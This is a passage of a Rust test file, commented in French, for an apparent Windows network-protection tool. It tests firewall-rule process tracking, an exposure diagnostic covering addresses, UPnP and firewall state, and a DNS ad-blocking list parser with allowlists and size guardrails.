    while n == 0 && debut.elapsed() < Duration::from_secs(20) {
        std::thread::sleep(Duration::from_millis(100));
        n = crate::blocage::terminer_powershell_regles();
    }
    assert_eq!(n, 1, "le PowerShell suivi est arrêté");
    fil.join().unwrap();
    assert!(debut.elapsed() < Duration::from_secs(40), "arrêté, pas attendu jusqu'au bout");
    assert!(crate::blocage::pids_regles_suivis().is_empty(), "plus suivi une fois terminé : son PID peut être redonné");
    assert_eq!(crate::blocage::terminer_powershell_regles(), 0);
}

/// PR 6.12 : suivi des PowerShell de règles, texte du retrait, compte rendu à nom unique
#[test]
fn regles_service_suivies_et_compte_rendu() {
    use crate::blocage::{restantes, SuiviRegles};
    use std::time::Duration;
    static S: SuiviRegles = SuiviRegles::new();
    assert_eq!(S.executer(|| 4), Some(4));
    // Un PowerShell en cours retarde l'arrêt ; ensuite plus rien ne démarre
    let fil = std::thread::spawn(|| S.executer(|| std::thread::sleep(Duration::from_millis(600))));
    std::thread::sleep(Duration::from_millis(100));
    let debut = std::time::Instant::now();
    assert!(S.arreter(Duration::from_secs(5)));
    assert!(debut.elapsed() >= Duration::from_millis(300), "attendu");
    assert!(fil.join().unwrap().is_some());
    assert_eq!(S.executer(|| 1), None, "après l'arrêt, rien ne démarre");
    static L: SuiviRegles = SuiviRegles::new();
    let _f = std::thread::spawn(|| L.executer(|| std::thread::sleep(Duration::from_millis(1_500))));
    std::thread::sleep(Duration::from_millis(100));
    assert!(!L.arreter(Duration::from_millis(200)), "échéance dépassée : dit");
    assert_eq!(restantes("\r\n3\r\n"), Some(3));
    assert_eq!(restantes("0"), Some(0));
    assert_eq!(restantes("erreur"), None);
    assert_eq!(restantes(""), None);
    use crate::moniteur::texte_retrait_regles as t;
    assert!(t(2, &(Some(0), String::new(), Some(0))).starts_with("Règles de pare-feu supprimées : 2 (et"));
    let x = t(1, &(Some(1), "Accès refusé\r\n".into(), Some(3)));
    assert!(x.contains("code 1") && x.contains("3 règle(s) restée(s)") && x.contains("erreur : Accès refusé") && x.contains("à la main"), "{x}");
    assert!(t(0, &(None, String::new(), None)).contains("code inconnu, ? règle(s)"));
    // Compte rendu : un nouveau nom à chaque fois, avec une partie aléatoire (S125-01)
    let (p1, p2) = (crate::natif::compte_rendu_systeme("d4t-essai-cr", "contenu"), crate::natif::compte_rendu_systeme("d4t-essai-cr", "contenu"));
    if let (Some(a), Some(b)) = (&p1, &p2) {
        assert_ne!(a, b, "deux noms différents dans la même seconde");
        assert_eq!(std::fs::read_to_string(a).unwrap(), "contenu");
        let nom = a.file_name().unwrap().to_string_lossy().to_string();
        let alea = nom.trim_end_matches(".txt").rsplit('-').nth(1).unwrap();
        assert!(alea.len() == 16 && alea.chars().all(|c| c.is_ascii_hexdigit()), "{nom}");
    }
    for p in [p1, p2].into_iter().flatten() {
        let _ = std::fs::remove_file(p);
    }
}


// ------------------------------------------------------------ diagnostic d'exposition (U5c-1)

fn entrees_diag() -> crate::parefeu::EntreesDiagnostic {
    crate::parefeu::EntreesDiagnostic {
        adresses: vec![],
        journal_actif: true,
        acceptees: 0,
        bloquees: 0,
        upnp_texte: "3 redirection(s) sur la box, dont 0 vers ce PC".into(),
        reseau_frais: true,
        redirections_vers_pc: 0,
        parefeu: Some(crate::parefeu::EtatParefeuWindows { profils: vec!["privé".into()], desactive: vec![], entrant_autorise: vec![] }),
    }
}

fn etat_de(d: &crate::parefeu::Diagnostic, piste: &str) -> String {
    d.constats.iter().find(|c| c.piste == piste).map(|c| c.etat.clone()).unwrap_or_default()
}

#[test]
fn diagnostic_tout_verifie_rien_releve_jamais_protege() {
    let d = crate::parefeu::diagnostiquer(&entrees_diag());
    assert_eq!(d.verdict, "rien_releve");
    assert!(d.constats.iter().all(|c| c.etat == "pas_constate"), "{:?}", d.constats);
    assert!(d.constats.iter().all(|c| !c.texte.contains("protégé") && !c.texte.contains("non exposé")));
}

#[test]
fn diagnostic_ipv6_globale_seule_a_surveiller_pas_exposee() {
    let mut e = entrees_diag();
    e.adresses = vec!["2001:db8::5 (Ethernet)".into()];
    let d = crate::parefeu::diagnostiquer(&e);
    assert_eq!(d.verdict, "a_surveiller");
    assert_eq!(etat_de(&d, "adresse_ipv6"), "constate");
    assert_eq!(etat_de(&d, "adresse_ipv4"), "pas_constate");
}

#[test]
fn diagnostic_ipv4_publique_ou_paquet_accepte_expose() {
    let mut e = entrees_diag();
    e.adresses = vec!["203.0.113.7 (Ethernet)".into()];
    assert_eq!(crate::parefeu::diagnostiquer(&e).verdict, "expose");
    let mut e = entrees_diag();
    e.acceptees = 2;
    assert_eq!(crate::parefeu::diagnostiquer(&e).verdict, "expose");
}

#[test]
fn diagnostic_bloque_seul_a_surveiller() {
    let mut e = entrees_diag();
    e.bloquees = 4;
    let d = crate::parefeu::diagnostiquer(&e);
    assert_eq!(d.verdict, "a_surveiller");
    assert_eq!(etat_de(&d, "paquets_bloques"), "constate");
}

#[test]
fn diagnostic_journal_inactif_jamais_rien_releve() {
    let mut e = entrees_diag();
    e.journal_actif = false;
    e.acceptees = 3; // ignorées : le journal ne les voit pas
    let d = crate::parefeu::diagnostiquer(&e);
    assert_eq!(d.verdict, "rien_releve_incomplet");
    assert_eq!(etat_de(&d, "paquets_acceptes"), "non_verifie");
}

#[test]
fn diagnostic_upnp_non_verifie_ancien_ou_en_echec() {
    for (texte, frais) in [("", true), ("3 redirection(s) sur la box, dont 1 vers ce PC", false), ("aucune box UPnP ne répond (UPnP désactivé ou absent)", true)] {
        let mut e = entrees_diag();
        e.upnp_texte = texte.into();
        e.reseau_frais = frais;
        e.redirections_vers_pc = 1; // une ancienne liste ne compte pas
        let d = crate::parefeu::diagnostiquer(&e);
        assert_eq!(etat_de(&d, "upnp"), "non_verifie", "{texte}");
        assert_eq!(d.verdict, "rien_releve_incomplet", "{texte}");
    }
    let mut e = entrees_diag();
    e.upnp_texte = "3 redirection(s) sur la box, dont 1 vers ce PC".into();
    e.redirections_vers_pc = 1;
    assert_eq!(crate::parefeu::diagnostiquer(&e).verdict, "expose");
}

#[test]
fn diagnostic_parefeu_illisible_desactive_ou_ouvert() {
    let mut e = entrees_diag();
    e.parefeu = None;
    let d = crate::parefeu::diagnostiquer(&e);
    assert_eq!((d.verdict.as_str(), etat_de(&d, "parefeu").as_str()), ("rien_releve_incomplet", "non_verifie"));
    let mut e = entrees_diag();
    e.parefeu = Some(crate::parefeu::EtatParefeuWindows { profils: vec!["public".into()], desactive: vec!["public".into()], entrant_autorise: vec![] });
    assert_eq!(crate::parefeu::diagnostiquer(&e).verdict, "a_surveiller");
    let mut e = entrees_diag();
    e.parefeu = Some(crate::parefeu::EtatParefeuWindows { profils: vec!["privé".into()], desactive: vec![], entrant_autorise: vec!["privé".into()] });
    assert_eq!(crate::parefeu::diagnostiquer(&e).verdict, "a_surveiller");
}

#[test]
fn diagnostic_textes_bornes_sans_controle() {
    let mut e = entrees_diag();
    e.upnp_texte = format!("erreur\r\n\u{1b}[31m{}", "x".repeat(10_000));
    let d = crate::parefeu::diagnostiquer(&e);
    assert!(d.constats.iter().all(|c| c.texte.chars().count() <= 200 && !c.texte.chars().any(|x| x.is_control())));
}

#[test]
fn diagnostic_etat_ancien_relu() {
    // Un etat.json écrit avant U5c-1 (sans Diagnostic) se relit avec un diagnostic vide
    let x: crate::parefeu::Exposition = serde_json::from_str(r#"{"Exposee":false,"Raisons":[],"Base":"b"}"#).unwrap();
    assert_eq!(x.diagnostic, crate::parefeu::Diagnostic::default());
}

#[test]
fn structure_diagnostic_lecture_seule() {
    // Le diagnostic ne parle ni au réseau ni à la box, et n'écrit rien dans le pare-feu
    let src = include_str!("parefeu.rs");
    let debut = src.find("// ------------------------------------------------------------ diagnostic d'exposition").unwrap();
    let fin = src.find("// ------------------------------------------------------------ adresses").unwrap();
    let code = &src[debut..fin];
    for interdit in ["TcpStream", "UdpSocket", "upnp::", ".put_", ".Add(", ".Remove(", "set_FirewallEnabled", "put_DefaultInboundAction"] {
        assert!(!code.contains(interdit), "{interdit}");
    }
}

#[test]
fn structure_lecture_parefeu_hors_verrou() {
    // La lecture du pare-feu part sur un fil et n'est jamais attendue par le moniteur (S148-01, préalable de #148)
    // Fins de ligne normalisées : une copie Windows ordinaire est extraite en CRLF (relecture de #148, D2)
    let moniteur = include_str!("moniteur.rs").replace("\r\n", "\n");
    assert!(!moniteur.contains("etat_parefeu_windows"));
    assert_eq!(moniteur.matches("parefeu::relancer_lecture_parefeu();").count(), 1);
    assert!(moniteur.contains("if parefeu::lecture_a_relancer() {\n            parefeu::relancer_lecture_parefeu();"), "au premier passage puis selon l'âge de la dernière lecture (S150-01)");
    assert!(moniteur.contains("parefeu: parefeu::etat_parefeu_courant(),"));
    let parefeu = include_str!("parefeu.rs").replace("\r\n", "\n");
    assert!(parefeu.contains("\nfn etat_parefeu_windows() -> Option<EtatParefeuWindows>"), "la lecture COM reste privée");
    assert!(parefeu.contains("if LECTURE_PAREFEU.swap(true, SeqCst) {\n        return;\n    }\n    std::thread::spawn("), "une lecture à la fois, sur un fil");
}

#[test]
fn lecture_parefeu_trop_ancienne_non_verifiee() {
    assert!(crate::parefeu::lecture_fraiche(std::time::Duration::from_secs(60)));
    assert!(crate::parefeu::lecture_fraiche(std::time::Duration::from_secs(900)));
    assert!(!crate::parefeu::lecture_fraiche(std::time::Duration::from_secs(901)));
    // Relance selon l'âge (S150-01) : jamais lue, ou plus de 5 min ; une lecture de 5 min reste fraîche 10 min encore
    assert!(crate::parefeu::lecture_a_relancer_selon(None));
    assert!(!crate::parefeu::lecture_a_relancer_selon(Some(std::time::Duration::from_secs(299))));
    assert!(crate::parefeu::lecture_a_relancer_selon(Some(std::time::Duration::from_secs(300))));
}

#[test]
fn exposee_selon_verdict_ipv6_et_bloque_seuls_pas_exposes() {
    // Q2 (mainteneur, 2026-11-10) : IPv6 globale seule et sources bloquées seules ne donnent plus « PC exposé »
    let mut e = entrees_diag();
    e.adresses = vec!["2001:db8::5 (Ethernet)".into()];
    e.bloquees = 3;
    assert!(!crate::parefeu::exposee_selon(&crate::parefeu::diagnostiquer(&e)));
    let mut e = entrees_diag();
    e.acceptees = 1;
    assert!(crate::parefeu::exposee_selon(&crate::parefeu::diagnostiquer(&e)));
    assert!(include_str!("moniteur.rs").contains("self.exposition.exposee = parefeu::exposee_selon(&self.exposition.diagnostic);"));
}

#[test]
fn diagnostic_upnp_ancien_cite_la_derniere_liste() {
    // Audit de #149, S149-02 : une redirection vue par une vérification ancienne est dite, sans mettre « exposé »
    let mut e = entrees_diag();
    e.reseau_frais = false;
    e.upnp_texte = "3 redirection(s) sur la box, dont 1 vers ce PC".into();
    e.redirections_vers_pc = 1;
    let d = crate::parefeu::diagnostiquer(&e);
    let c = d.constats.iter().find(|c| c.piste == "upnp").unwrap();
    assert_eq!(c.etat, "non_verifie");
    assert!(c.texte.contains("dernière liste connue : 1 redirection(s) vers ce PC"), "{}", c.texte);
    assert_ne!(d.verdict, "expose");
}

// ------------------------------------------------------------ phase 7, PR 7.2 : moteur de filtrage (aucun effet réseau)

fn liste_filtrage(texte: &str, f: &crate::filtrage::Filtrage) -> crate::filtrage::ListeLue {
    crate::filtrage::lire_liste(texte, f.protection())
}

/// Domaine et parents : `a.b.pub.test` bloqué par `pub.test` ; jamais le domaine de premier niveau seul ; un nom
/// allongé d'étiquettes reste bloqué (parents les plus courts) ; catégorie inactive : relayé
#[test]
fn filtrage_parent_bloque() {
    use crate::filtrage::{Categorie, Filtrage, Verdict};
    let mut f = Filtrage::nouveau(&[]);
    let l = liste_filtrage("||pub.test^\n", &f);
    assert!(f.ajouter("Essai", Categorie::Publicite, l));
    let bloque = |n: &str| f.decider(n, &[Categorie::Publicite]);
    assert_eq!(bloque("a.b.pub.test"), Verdict::Bloque { categorie: Categorie::Publicite, liste: "Essai".into() });
    assert_eq!(bloque("PUB.test."), Verdict::Bloque { categorie: Categorie::Publicite, liste: "Essai".into() });
    assert_eq!(bloque("test"), Verdict::Relaye, "domaine de premier niveau seul");
    assert_eq!(bloque("autre.test"), Verdict::Relaye);
    assert_eq!(bloque("pubXtest"), Verdict::Relaye);
    let long = format!("{}pub.test", "x.".repeat(40));
    assert!(matches!(bloque(&long), Verdict::Bloque { .. }), "nom allongé : {long}");
    assert_eq!(f.decider("a.pub.test", &[]), Verdict::Relaye, "aucune catégorie active");
    assert_eq!(f.decider("a.pub.test", &[Categorie::Securite]), Verdict::Relaye, "autre catégorie");
    assert!(crate::filtrage::noms_a_chercher(&long).len() <= crate::filtrage::MAX_RECHERCHES);
    assert_eq!(crate::filtrage::noms_a_chercher("a.b.pub.test"), vec!["a.b.pub.test", "b.pub.test", "pub.test"]);
}

/// Constat C-12 (audit du 2026-11-23) : un nom dont une étiquette est refusée par `nom_domaine_valide` est jugé comme
/// son parent valide le plus long : le domaine bloqué le reste, la protection et les autorisations aussi ; sans parent
/// valide, relayé
#[test]
fn filtrage_etiquette_invalide_parent_bloque() {
    use crate::filtrage::{parent_valide, Categorie, Filtrage, Verdict};
    let mut f = Filtrage::nouveau(&[]);
    let l = liste_filtrage("||pub.test^
", &f);
    assert!(f.ajouter("Essai", Categorie::Publicite, l));
    f.autoriser(&["ok.pub.test".to_string()]);
    let bloque = Verdict::Bloque { categorie: Categorie::Publicite, liste: "Essai".into() };
    let juge = |n: &str| f.decider(n, &[Categorie::Publicite]);
    for nom in ["x!y.pub.test", "a\u{FFFD}b.pub.test", "-a.pub.test", "a-.b.pub.test", "a*.pub.test"] {
        assert_eq!(juge(nom), bloque, "{nom:?}");
    }
    assert_eq!(juge(&format!("{}.pub.test", "x".repeat(64))), bloque, "étiquette de plus de 63 caractères");
    assert_eq!(juge("x!.ok.pub.test"), Verdict::Autorise, "autorisation du parent");
    assert_eq!(juge("x!.www.msftconnecttest.com"), Verdict::Protege, "protection du parent");
    assert_eq!(juge("x!.autre.test"), Verdict::Relaye);
    assert_eq!(juge("pub.t!st"), Verdict::Relaye, "aucun parent valide");
    assert_eq!(juge("x!.co.uk"), Verdict::Relaye, "suffixe public seul : jamais un domaine");
    assert_eq!(parent_valide("x!y.a.pub.test").as_deref(), Some("a.pub.test"), "le plus long");
    assert_eq!(parent_valide("pub.test"), None, "nom sans parent de deux étiquettes");
}

/// Liste de protection : jamais bloquée, sous-domaines compris, même présente dans une liste (ignorée et comptée) ;
/// hôtes de la configuration (remontée, mise à jour) protégés aussi
#[test]
fn filtrage_protection_prime() {
    use crate::filtrage::{Categorie, Filtrage, Verdict};
    let mut f = Filtrage::nouveau(&["ntfy.exemple.test".to_string()]);
    let l = liste_filtrage("||windowsupdate.com^\n0.0.0.0 x.windowsupdate.com\nwww.msftconnecttest.com\n||ntfy.exemple.test^\n||pub.test^\n", &f);
    assert_eq!(l.compte.proteges_ignores, 4, "{:?}", l.compte);
    assert_eq!(l.compte.entrees, 1);
    assert!(f.ajouter("Essai", Categorie::Securite, l));
    for n in ["windowsupdate.com", "a.x.windowsupdate.com", "www.msftconnecttest.com", "ntfy.exemple.test", "time.windows.com"] {
        assert_eq!(f.decider(n, &[Categorie::Securite, Categorie::Publicite]), Verdict::Protege, "{n}");
    }
    assert!(matches!(f.decider("pub.test", &[Categorie::Securite]), Verdict::Bloque { .. }));
    assert_eq!(crate::filtrage::hote_d_url("https://ntfy.exemple.test:8443/sujet?x=1").as_deref(), Some("ntfy.exemple.test"));
    assert_eq!(crate::filtrage::hote_d_url("http://ntfy.exemple.test/"), None, "https seulement");
    assert_eq!(crate::filtrage::hote_d_url("https://192.0.2.1/"), None, "adresse IP : rien à protéger par le nom");
}

/// Autorisation de l'utilisateur : jamais bloqué, sous-domaines compris ; une exception `@@` d'une liste ne lève que
/// les blocages de sa catégorie
#[test]
fn filtrage_autorisation_prime() {
    use crate::filtrage::{Categorie, Filtrage, Verdict};
    let mut f = Filtrage::nouveau(&[]);
    let l = liste_filtrage("||mal.test^\n", &f);
    assert!(f.ajouter("Sécurité", Categorie::Securite, l));
    let l = liste_filtrage("||pisteur.test^\n@@||ok.pisteur.test^\n@@||mal.test^\n", &f);
    assert!(f.ajouter("Pub", Categorie::Publicite, l));
    let toutes = [Categorie::Securite, Categorie::Publicite];
    assert_eq!(f.decider("ok.pisteur.test", &toutes), Verdict::Autorise);
    assert_eq!(f.decider("a.ok.pisteur.test", &toutes), Verdict::Autorise);
    assert!(matches!(f.decider("x.pisteur.test", &toutes), Verdict::Bloque { categorie: Categorie::Publicite, .. }));
    assert!(matches!(f.decider("mal.test", &toutes), Verdict::Bloque { categorie: Categorie::Securite, .. }),
        "l'exception d'une liste de publicité ne lève pas un blocage de sécurité");
    f.autoriser(&["pisteur.test".to_string(), "mal.test".to_string(), "invalide".to_string()]);
    assert_eq!(f.decider("x.pisteur.test", &toutes), Verdict::Autorise);
    assert_eq!(f.decider("mal.test", &toutes), Verdict::Autorise, "l'utilisateur prime sur toute liste");
    f.autoriser(&[]);
    assert!(matches!(f.decider("x.pisteur.test", &toutes), Verdict::Bloque { .. }), "autorisation retirée");
}

/// Sous-ensemble accepté : hosts, domaine seul, `||d^`, `@@||d^` ; toute autre règle écartée et comptée
#[test]
fn filtrage_adblock_sous_ensemble() {
    use crate::filtrage::{analyser_ligne, Ligne};
    let b = |d: &str| Ligne::Bloque(d.to_string());
    assert_eq!(analyser_ligne("||pub.test^"), b("pub.test"));
    assert_eq!(analyser_ligne("  ||Pub.Test^  "), b("pub.test"));
    assert_eq!(analyser_ligne("@@||ok.pub.test^"), Ligne::Exception("ok.pub.test".into()));
    assert_eq!(analyser_ligne("0.0.0.0 pub.test"), b("pub.test"));
    assert_eq!(analyser_ligne("127.0.0.1\tpub.test # commentaire"), b("pub.test"));
    assert_eq!(analyser_ligne(":: pub.test"), b("pub.test"));
    assert_eq!(analyser_ligne("pub.test"), b("pub.test"));
    assert_eq!(analyser_ligne("xn--rvolution-c4a.test"), b("xn--rvolution-c4a.test"));
    for ecartee in ["||pub.test^$third-party", "||pub.test/chemin^", "/banniere/", "##.pub", "pub.test##.encart",
        "example.test#@#.pub", "||pub.test^|", "|https://pub.test/", "||*.pub.test^", "/^regex$/", "@@||pub.test^$document",
        "0.0.0.0 localhost", "0.0.0.0 0.0.0.0", "révolution.test", "pub..test", "a b c", "||test^", "||192.0.2.1^", "||x.in-addr.arpa^"] {
        assert_eq!(analyser_ligne(ecartee), Ligne::Ecartee, "{ecartee:?}");
    }
    for ignoree in ["", "   ", "! Titre : EasyPrivacy", "# commentaire hosts", "[Adblock Plus 2.0]"] {
        assert_eq!(analyser_ligne(ignoree), Ligne::Ignoree, "{ignoree:?}");
    }
    let f = crate::filtrage::Filtrage::nouveau(&[]);
    let l = liste_filtrage("! en-tête\n||a.test^\n||a.test^\n||b.test^$image\n@@||c.test^\n##.pub\nd.test\n", &f);
    assert_eq!(l.compte, crate::filtrage::Compte { entrees: 2, exceptions: 1, ecartees: 2, proteges_ignores: 0 });
}

/// Garde-fou du remplacement : vide, effondrée (moins de la moitié) ou explosée (plus du double) : refusée, copie
/// précédente gardée
#[test]
fn filtrage_liste_effondree_refusee() {
    use crate::filtrage::{remplacement_admis, MAX_ENTREES_LISTE};
    assert!(!remplacement_admis(1000, 499, &[]), "effondrée");
    assert!(remplacement_admis(1000, 500, &[]));
    assert!(remplacement_admis(1000, 2000, &[]));
    assert!(!remplacement_admis(1000, 2001, &[]), "explosée");
    assert!(!remplacement_admis(1000, 0, &[]), "vide");
    assert!(!remplacement_admis(0, 0, &[]), "vide sans copie précédente");
    assert!(remplacement_admis(0, 5, &[]), "première copie");
    assert!(remplacement_admis(MAX_ENTREES_LISTE, MAX_ENTREES_LISTE, &[]), "au plafond");
    assert!(!remplacement_admis(usize::MAX, usize::MAX, &[usize::MAX, usize::MAX]), "pas de débordement, plafond");
}

/// Constat C-4 (audit du 2026-11-23) : le garde-fou n'est plus à sens unique. Plafond fixe vérifié avant de garder une
/// copie, premier téléchargement compris ; une copie gonflée admise n'enferme plus la liste : la liste saine est admise
/// après `CONCORDANTS` téléchargements refusés de suite qui donnent la même taille (à 10 % près), jamais sur des
/// tailles qui divergent
#[test]
fn filtrage_garde_fou_liste_gonflee() {
    use crate::filtrage::{remplacement_admis, CONCORDANTS, MAX_ENTREES_LISTE};
    assert_eq!(CONCORDANTS, 3);
    assert!(!remplacement_admis(0, MAX_ENTREES_LISTE + 1, &[]), "premier téléchargement gonflé : refusé");
    assert!(!remplacement_admis(MAX_ENTREES_LISTE, MAX_ENTREES_LISTE + 1, &[MAX_ENTREES_LISTE + 1; 3]), "au-delà du plafond : jamais");
    // Copie gardée gonflée (4000), liste saine (1000) : refusée deux fois, admise à la troisième
    assert!(!remplacement_admis(4000, 1000, &[]));
    assert!(!remplacement_admis(4000, 1010, &[1000]));
    assert!(remplacement_admis(4000, 990, &[1000, 1010]), "trois téléchargements concordants");
    assert!(remplacement_admis(4000, 990, &[3000, 1000, 1010]), "les deux derniers refus comptent");
    // Tailles qui divergent : toujours refusée
    assert!(!remplacement_admis(4000, 1000, &[1000, 1500]));
    assert!(!remplacement_admis(4000, 1000, &[700, 1000]));
    assert!(!remplacement_admis(1000, 5000, &[2600]), "un seul refus ne suffit pas");
    assert!(remplacement_admis(1000, 5000, &[5200, 4800]), "source vraiment agrandie : admise après trois téléchargements");
    // État des refus : oublié à la première copie admise, trois tailles au plus
    let src = include_str!("filtrage.rs");
    let t = &src[src.find("pub fn telecharger(").unwrap()..];
    let admis = &t[t.find("if remplacement_admis(ancienne, nouvelle, &refusees_de(s.nom))").expect("refus passés")..];
    assert!(admis.find("oublier_refus(s.nom)").unwrap() < admis.find("} else {").unwrap(), "refus oubliés à l'admission");
    assert!(admis.contains("noter_refus(s.nom, nouvelle)"));
}

/// Constat C-11 (audit du 2026-11-23) : la taille d'un fichier de liste est contrôlée avant de le lire en entier (copie
/// téléchargée comme copie gardée) ; curl seul ne borne pas un envoi sans longueur annoncée
#[test]
fn filtrage_taille_controlee_avant_lecture() {
    use crate::filtrage::{lire_liste_bornee, taille_admise, MAX_OCTETS};
    assert!(taille_admise(MAX_OCTETS) && taille_admise(0) && !taille_admise(MAX_OCTETS + 1) && !taille_admise(u64::MAX));
    let d = std::env::temp_dir().join(format!("d4t-c11-{}", std::process::id()));
    let _ = std::fs::create_dir_all(&d);
    let petit = d.join("petit.txt");
    std::fs::write(&petit, "||pub.test^
").unwrap();
    assert_eq!(lire_liste_bornee(&petit).as_deref(), Some("||pub.test^
"), "témoin retenu");
    let gros = d.join("gros.txt");
    std::fs::File::create(&gros).unwrap().set_len(MAX_OCTETS + 1).unwrap();
    assert_eq!(lire_liste_bornee(&gros), None, "témoin écarté sans être lu");
    assert_eq!(lire_liste_bornee(&d.join("absent.txt")), None, "lecture impossible");
    let _ = std::fs::remove_dir_all(&d);
    let src = include_str!("filtrage.rs");
    let corps = &src[src.find("pub(crate) fn lire_liste_bornee(").unwrap()..];
    assert!(corps.find("taille_admise(").unwrap() < corps.find("lire_fichier_proprietaire(").unwrap(), "taille avant lecture");
    for f in ["fn entrees_du_fichier(", "pub fn charger("] {
        let c = &src[src.find(f).unwrap()..];
        let c = &c[..c.find("\n}").unwrap_or(c.len())];
        assert!(c.contains("lire_liste_bornee(") && !c.contains("lire_fichier_proprietaire("), "{f}");
    }
}

/// Total borné : une liste qui ferait dépasser `MAX_ENTREES` n'est pas chargée (rien n'est tronqué)
#[test]
fn filtrage_total_borne() {
    use crate::filtrage::{Categorie, Compte, Filtrage, ListeLue, MAX_ENTREES};
    let mut f = Filtrage::nouveau(&[]);
    let grande = ListeLue { bloques: (0..MAX_ENTREES as u64).collect(), exceptions: vec![], compte: Compte::default() };
    assert!(f.ajouter("Grande", Categorie::Publicite, grande));
    let une = ListeLue { bloques: vec![u64::MAX], exceptions: vec![], compte: Compte::default() };
    assert!(!f.ajouter("Une de trop", Categorie::Publicite, une));
    assert_eq!(f.total(), MAX_ENTREES);
    assert_eq!(f.bilan.len(), 1);
}

/// Rien sans catégorie active : aucune liste téléchargée (aucun accès réseau) ni chargée ; noms inconnus ignorés ;
/// aucune source de sécurité compilée (D7-2), et le bilan le dit
#[test]
fn filtrage_rien_sans_categorie() {
    use crate::filtrage::{categories_actives, resume, telecharger, Categorie, Filtrage, SOURCES};
    let mut c = crate::commun::Config::default();
    assert!(categories_actives(&c).is_empty());
    assert!(telecharger(&[], &[]).is_empty());
    assert!(resume(&[], &Filtrage::nouveau(&[])).contains("aucune catégorie active"));
    c.filtrage.categories = vec!["publicite".into(), "inconnue".into(), "publicite".into(), "securite".into()];
    assert_eq!(categories_actives(&c), vec![Categorie::Securite, Categorie::Publicite]);
    assert!(SOURCES.iter().all(|s| s.categorie == Categorie::Publicite && s.url.starts_with("https://")));
    let r = resume(&[Categorie::Securite], &Filtrage::nouveau(&[]));
    assert!(r.contains("aucune liste de sécurité retenue") && r.contains("aucun effet réseau"), "{r}");
    // Configuration : la clé Filtrage est connue (une clé de même nom à la casse près serait refusée, AUD6-03)
    let modele = serde_json::to_value(crate::commun::Config::default()).unwrap();
    assert!(modele.get("Filtrage").and_then(|f| f.get("Autorises")).is_some());
    let lue: crate::commun::Config = serde_json::from_str(r#"{"Filtrage":null}"#).unwrap();
    assert!(lue.filtrage.categories.is_empty());
}

/// Suffixe public de deux étiquettes : jamais un domaine de liste, ni une autorisation (audit de #160, S160-01) ; un
/// domaine enregistré sous ce suffixe reste bloquable
#[test]
fn filtrage_suffixe_public_ecarte() {
    use crate::filtrage::{analyser_ligne, normaliser, suffixe_public, Categorie, Filtrage, Ligne, Verdict};
    for s in ["co.uk", "gouv.fr", "com.br", "gov.uk", "ac.jp", "org.au", "net.nz"] {
        assert!(suffixe_public(s), "{s}");
        assert_eq!(normaliser(s), None, "{s}");
        assert_eq!(analyser_ligne(&format!("||{s}^")), Ligne::Ecartee, "{s}");
        assert_eq!(analyser_ligne(&format!("@@||{s}^")), Ligne::Ecartee, "{s}");
        assert_eq!(analyser_ligne(&format!("0.0.0.0 {s}")), Ligne::Ecartee, "{s}");
    }
    assert_eq!(analyser_ligne("||pub.co.uk^"), Ligne::Bloque("pub.co.uk".into()));
    assert!(!suffixe_public("exemple.fr") && !suffixe_public("co.exemple.fr"));
    let mut f = Filtrage::nouveau(&[]);
    let l = crate::filtrage::lire_liste("||gouv.fr^\n||pub.co.uk^\n", f.protection());
    assert_eq!((l.compte.entrees, l.compte.ecartees), (1, 1));
    assert!(f.ajouter("Essai", Categorie::Publicite, l));
    assert_eq!(f.decider("www.service.gouv.fr", &[Categorie::Publicite]), Verdict::Relaye);
    assert!(matches!(f.decider("a.pub.co.uk", &[Categorie::Publicite]), Verdict::Bloque { .. }));
    assert!(crate::validation::valider(&commande_json(r#"{"Action":"filtrageAutoriser","NomDns":"co.uk"}"#)).is_err());
}

/// Commandes filtrageAutoriser et filtrageRetirer : administrateurs seulement (comme toute commande), domaine validé
#[test]
fn filtrage_commandes_validees() {
    use crate::validation::{autorisee, valider, Client};
    assert!(valider(&commande_json(r#"{"Action":"filtrageEssai","Valeur":"on"}"#)).is_ok());
    assert!(valider(&commande_json(r#"{"Action":"filtrageEssai","Valeur":"off"}"#)).is_ok());
    assert!(valider(&commande_json(r#"{"Action":"filtrageEssai","Valeur":"toujours"}"#)).is_err());
    assert!(valider(&commande_json(r#"{"Action":"filtrageEssai"}"#)).is_err());
    assert!(!autorisee("filtrageEssai", Client::Autre));
    for a in ["filtrageAutoriser", "filtrageRetirer"] {
        assert!(autorisee(a, Client::Administrateur) && !autorisee(a, Client::Autre), "{a}");
        assert!(valider(&commande_json(&format!(r#"{{"Action":"{a}","NomDns":"ok.pub.test"}}"#))).is_ok(), "{a}");
        for mauvais in [r#""NomDns":"test""#, r#""NomDns":"révolution.test""#, r#""NomDns":"192.0.2.1""#, r#""NomDns":"""#, r#""Cible":"pub.test""#] {
            assert!(valider(&commande_json(&format!(r#"{{"Action":"{a}",{mauvais}}}"#))).is_err(), "{a} {mauvais}");
        }
    }
}

/// Parseur de listes : aucune panique, quelle que soit l'entrée
#[test]
fn filtrage_torturer() {
    let f = crate::filtrage::Filtrage::nouveau(&[]);
    torturer_texte("||pub.test^\n@@||ok.pub.test^\n0.0.0.0 x.test # c\n##.pub\n", &mut |t| {
        for l in t.lines() {
            let _ = crate::filtrage::analyser_ligne(l);
        }
        let _ = crate::filtrage::lire_liste(t, f.protection());
        let _ = crate::filtrage::noms_a_chercher(t);
        let _ = f.decider(t, &[crate::filtrage::Categorie::Publicite]);
    });
    // C-12 : parent d'un nom invalide
    torturer_texte("x!\u{FFFD}.a-.b.pub.test.", &mut |t| {
        let _ = crate::filtrage::parent_valide(t);
        let _ = f.decider(t, &[crate::filtrage::Categorie::Publicite]);
    });
}

// ------------------------------------------------------------ phase 7, PR 7.6 : résolveur tiers choisi (Quad9)

/// Repli au portail captif : tiers muet et réseau qui répond → réseau ; tiers qui répond de nouveau → tiers ; sans tiers
/// choisi, jamais de repli ; tiers muet et réseau muet → on garde (la dégradation ouverte s'en charge)
#[test]
fn amont_tiers_repli_portail() {
    use crate::filtrage::{amont_tiers_repli, Repli};
    assert_eq!(amont_tiers_repli(true, false, false, true), Repli::VersReseau);
    assert_eq!(amont_tiers_repli(true, false, false, false), Repli::Garder);
    assert_eq!(amont_tiers_repli(true, false, true, true), Repli::Garder);
    assert_eq!(amont_tiers_repli(true, true, true, false), Repli::VersTiers);
    assert_eq!(amont_tiers_repli(true, true, false, true), Repli::Garder);
    assert_eq!(amont_tiers_repli(false, false, false, true), Repli::Garder);
    assert_eq!(amont_tiers_repli(false, true, true, true), Repli::VersReseau, "tiers retiré pendant un repli : réseau");
}

/// Relecture de #167, D1 : la commande filtrageAmont prend le verrou des cartes ; la sonde relit la configuration sous
